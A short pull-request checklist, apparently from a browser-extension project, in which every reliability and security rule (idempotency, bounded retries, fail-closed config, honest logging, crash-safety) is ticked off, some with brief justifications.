- [x] No local state committed before its remote effect, or the flow is resumable with an idempotency key (R2.1)
- [x] Every retry is bounded + backed off; non-idempotent ops are not blind-retried (R1.4) — no retries added
- [x] Accept/poll/listen loops survive transient errors (R1.5)
- [x] Acks/deletes happen only after durable handoff (R1.6) — inbound path untouched
- [x] New/changed wire types: camelCase, deny_unknown_fields where security-relevant, schema registered, all consumers (incl. JS) updated (R3.*) — none
- [x] Config absence = most restrictive; fail-closed if enforcement can't start (R5.*)
- [x] Logs/status claim only what was verified; background-job failures are surfaced (R6.*)
- [x] "Process dies on the next line" answered for every mutation touched (R2.1) — the registration is re-reconciled on every cold start; the offscreen document is recreated on demand
- [x] Deviations from this guide flagged explicitly with rule numbers — none
